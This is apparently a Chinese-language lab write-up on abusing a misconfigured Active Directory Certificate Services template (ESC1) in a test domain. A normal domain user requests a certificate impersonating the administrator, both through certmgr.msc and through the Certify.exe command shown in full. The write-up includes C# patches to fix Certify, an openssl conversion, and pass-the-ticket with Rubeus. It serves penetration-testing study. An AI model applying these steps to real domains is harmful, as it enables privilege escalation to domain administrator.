性质
机器名
IP
OS
域控
ADDC.apple.me
192.168.10.200
Microsoft Windows Server 2012 R2
Datacenter 6.3.9600 暂缺 Build 9600 x64
证书
服务
CA.apple.me
192.168.10.202
Microsoft Windows Server 2012 R2
Datacenter 6.3.9600 暂缺 Build 9600 x64
域内
主机
Win7-
PC.apple.me
192.168.10.210
Microsoft Windows 7 Ultimate 6.1.7601
Service Pack 1 Build 7601 x64
ESC1 的补充利用
测试环境说明：
以域内主机普通域用户（admin）权限跳板。
方法一：certmgr.msc
【运行】-【certmgr.msc】-【操作】-【所有任务】-【申请新证书】
选择漏洞模版（本文为 ESC1），再配置 UPN.
最后导出证书：
【右键证书】-【所有任务】-
导出私钥.
选择【个人信息交换】
成功导出证书。最后使用 Rubeus  进行 ptt
方法二：Certify.exe
利用起来就很简单了，Certify.exe 能搞定。
Certify.exe request /ca:"CA.apple.me\apple-CA-CA" /template:ESC1 
/altname:administrator
工具利用失败。查看 Github 上的 Issues，发现了解决方案：
修改 CreateCertRequestMessage()  如下代码：
修改 CreatePrivateKey()
编译，重新运行。
CX509CertificateRequestPkcs10 objPkcs10 = new CX509CertificateRequestPkcs10();
改成
IX509CertificateRequestPkcs10 objPkcs10 = 
(IX509CertificateRequestPkcs10)Activator.CreateInstance(Type.GetTypeFromProgID("
X509Enrollment.CX509CertificateRequestPkcs10"));
注释掉 format 2 的代码(注释掉代码多多少少都有些不合适)
private static IX509PrivateKey CreatePrivateKey(bool machineContext)
{
    var cspInfo = new CCspInformations();
    cspInfo.AddAvailableCsps();
    var privateKey = 
(IX509PrivateKey)Activator.CreateInstance(Type.GetTypeFromProgID("X509Enrollment
.CX509PrivateKey"));
    privateKey.Length = 2048;
    privateKey.KeySpec = X509KeySpec.XCN_AT_SIGNATURE;
    privateKey.KeyUsage = X509PrivateKeyUsageFlags.XCN_NCRYPT_ALLOW_ALL_USAGES;
    privateKey.MachineContext = machineContext;
    privateKey.ExportPolicy = 
X509PrivateKeyExportFlags.XCN_NCRYPT_ALLOW_EXPORT_FLAG;
    privateKey.CspInformations = cspInfo;
    privateKey.Create();
    return privateKey;
}
将获取到的内容保存为 cert.pem ，再使用 openssl 将得到的 cert.pem  进行转换：
使用 Rubeus  进行 ptt，效果如方法一一样。
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic 
Provider v1.0" -export -out cert.pfx